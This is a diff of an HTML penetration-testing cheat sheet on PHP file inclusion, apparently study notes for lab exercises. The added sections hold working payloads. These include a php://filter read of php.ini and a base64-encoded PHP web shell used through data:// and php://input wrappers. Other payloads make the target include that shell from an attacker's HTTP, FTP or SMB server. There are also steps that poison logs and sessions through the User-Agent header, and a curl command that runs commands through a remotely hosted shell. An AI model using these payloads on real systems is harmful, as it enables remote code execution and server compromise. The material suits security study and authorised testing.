@@ -768,6 +768,15 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#checking-php-configurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Checking PHP Configurations
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -795,6 +804,15 @@
   <a href="#lfi-wordlists" class="md-nav__link">
     <span class="md-ellipsis">
       LFI Wordlists
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfi-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      LFI tools
     </span>
   </a>
   
@@ -1200,6 +1218,15 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#checking-php-configurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Checking PHP Configurations
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -1227,6 +1254,15 @@
   <a href="#lfi-wordlists" class="md-nav__link">
     <span class="md-ellipsis">
       LFI Wordlists
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfi-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      LFI tools
     </span>
   </a>
   
@@ -1321,6 +1357,27 @@
 </table>
 <h3 id="second-order-attacks">Second order attacks</h3>
 <p>Setting user names to <code>../../../../etc/passwd</code>, for example, could result in the LFI elsewhere the username is used.</p>
+<h3 id="checking-php-configurations">Checking PHP Configurations</h3>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1">curl<span class="w"> </span><span class="s2">&quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;</span><span class="w"> </span>
+</span><span id="__span-0-2"><span class="c1"># 7.4 should be whatever php version is in use</span>
+</span><span id="__span-0-3"><span class="c1"># /etc/php/X.Y/apache2/php.ini for Apache or /etc/php/X.Y/fpm/php.ini for nginx</span>
+</span><span id="__span-0-4"><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>allow_url_include
+</span><span id="__span-0-5"><span class="c1"># check for value of allow_url_include (not enabled by default)</span>
+</span><span id="__span-0-6"><span class="c1"># allow_url_include required to be on for use of various wrappers, including the data and input wrappers</span>
+</span><span id="__span-0-7"><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>expect
+</span><span id="__span-0-8"><span class="c1"># check for except extension</span>
+</span><span id="__span-0-9">python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import urllib.parse;print(urllib.parse.quote_plus(&quot;PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&quot;))&#39;</span>
+</span><span id="__span-0-10"><span class="c1"># URL encoding for get requests</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="remote-code-execution">Remote Code Execution</h2>
 <table>
 <thead>
@@ -1336,7 +1393,7 @@
 </tr>
 <tr>
 <td><code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></td>
-<td>RCE with data wrapper</td>
+<td>RCE with <code>data</code> wrapper (only available to use if the <code>allow_url_include</code> setting is enabled in the PHP configurations), base64 encoded <code>'&lt;?php system($_GET["cmd"]); ?&gt;'</code>, prepend with <code>curl -s 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;</code> to preform with curl in command prompt</td>
 </tr>
 <tr>
 <td><code>curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id"</code></td>
@@ -1351,12 +1408,24 @@
 <td></td>
 </tr>
 <tr>
+<td><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://127.0.0.1:80/index.php</code></td>
+<td>Start by trying to include a local string, see if included as source code or executed as php etc <strong>NOTE</strong> Including the page itself (i.e. index.php) could cause a recursive loop DOS</td>
+</tr>
+<tr>
 <td><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code></td>
 <td>Host web shell</td>
 </tr>
 <tr>
 <td><code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></td>
-<td>Include remote PHP web shell</td>
+<td>Include remote PHP web shell, inspect received connection, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload</td>
+</tr>
+<tr>
+<td><code>sudo python -m pyftpdlib -p 21</code></td>
+<td>Hosting file through ftp instead</td>
+</tr>
+<tr>
+<td><code>impacket-smbserver -smb2support share $(pwd)</code></td>
+<td>Hosting file through SMB for windows servers, then use <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\&lt;OUR_IP&gt;\share\shell.php&amp;cmd=whoami</code> (more likely to work if we were on the same network)</td>
 </tr>
 <tr>
 <td><strong>LFI + Upload</strong></td>
@@ -1387,12 +1456,20 @@
 <td>RCE with malicious uploaded phar</td>
 </tr>
 <tr>
+<td><a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html">LFI to RCE via PHPInfo</a></td>
+<td>Obsolete method</td>
+</tr>
+<tr>
 <td><strong>Log Poisoning</strong></td>
 <td></td>
 </tr>
 <tr>
 <td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></td>
 <td>Read PHP session parameters</td>
+</tr>
+<tr>
+<td><code>/index.php?language=session_poisoning</code></td>
+<td>Test if session poisoning possible</td>
 </tr>
 <tr>
 <td><code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></td>
@@ -1403,8 +1480,12 @@
 <td>RCE through poisoned PHP session</td>
 </tr>
 <tr>
+<td><code>/index.php?language=/var/log/apache2/access.log</code></td>
+<td>Check if access logs available (error.log another common option), Once confirmed try changing user agent in burp and see if it is displayed</td>
+</tr>
+<tr>
 <td><code>curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php" -A '&lt;?php system($_GET["cmd"]); ?&gt;'</code></td>
-<td>Poison server log</td>
+<td>Poison server log by setting user agent</td>
 </tr>
 <tr>
 <td><code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code></td>
@@ -1412,6 +1493,29 @@
 </tr>
 </tbody>
 </table>
+<p><strong>NOTE</strong> PHPSESSID is saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.</p>
+<p><strong>NOTE</strong> By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. If not default could use an <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Wordlist</a> to fuzz for their locations.</p>
+<p><strong>Tip</strong> Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.</p>
+<p><strong>Tip</strong> The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.</p>
+<p>Other possibly readable logs:
+- /var/log/sshd.log
+- /var/log/mail
+- /var/log/vsftpd.log</p>
+<p><strong>TIP</strong> Using curl for RFI</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1">curl<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;\n&quot;</span><span class="w"> </span>-s<span class="w"> </span><span class="s1">&#39;http://10.129.29.114/index.php?language=http://10.10.14.202:8000/webShell.php&amp;cmd=ls+/&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;&lt;.*&gt;&quot;</span>
+</span><span id="__span-1-2"><span class="c1"># curl flags:</span>
+</span><span id="__span-1-3"><span class="c1">#   -w &quot;\n&quot;: Append newline</span>
+</span><span id="__span-1-4"><span class="c1">#   -s: Silent mode</span>
+</span><span id="__span-1-5"><span class="c1"># grep flags:</span>
+</span><span id="__span-1-6"><span class="c1">#   -v: Invert match (exclude matching lines)</span>
+</span><span id="__span-1-7"><span class="c1">#   &lt;.*&gt;: Regex for lines containing HTML tags</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="misc">Misc</h2>
 <p><strong><a href="https://www.php.net/manual/en/filters.php">PHP filters</a></strong>
 - <a href="https://www.php.net/manual/en/filters.string.php">String Filters</a>
@@ -1431,15 +1535,15 @@
 <td>Fuzz for PHP files</td>
 </tr>
 <tr>
-<td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code></td>
+<td><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code></td>
 <td>Fuzz page parameters</td>
 </tr>
 <tr>
-<td><code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code></td>
+<td><code>ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code></td>
 <td>Fuzz LFI payloads</td>
 </tr>
 <tr>
-<td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code></td>
+<td><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code></td>
 <td>Fuzz webroot path</td>
 </tr>
 <tr>
@@ -1450,11 +1554,19 @@
 </table>
 <h2 id="lfi-wordlists">LFI Wordlists</h2>
 <ul>
-<li>LFI-Jhaddix.txt</li>
-<li>Webroot path wordlist for Linux</li>
-<li>Webroot path wordlist for Windows</li>
-<li>Server configurations wordlist for Linux</li>
-<li>Server configurations wordlist for Windows</li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-Jhaddix.txt</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">Webroot path wordlist for Linux</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">Webroot path wordlist for Windows</a></li>
+<li><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">Server configurations wordlist for Linux</a></li>
+<li><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows">Server configurations wordlist for Windows</a></li>
+<li><a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters">Popular LFI parameters</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI wordlists</a></li>
+</ul>
+<h2 id="lfi-tools">LFI tools</h2>
+<ul>
+<li><a href="https://github.com/D35m0nd142/LFISuite">LFISuite</a></li>
+<li><a href="https://github.com/OsandaMalith/LFiFreak">LFiFreak</a></li>
+<li><a href="https://github.com/mzfr/liffy">liffy</a></li>
 </ul>
 <h2 id="file-inclusion-functions">File Inclusion Functions</h2>
 <table>
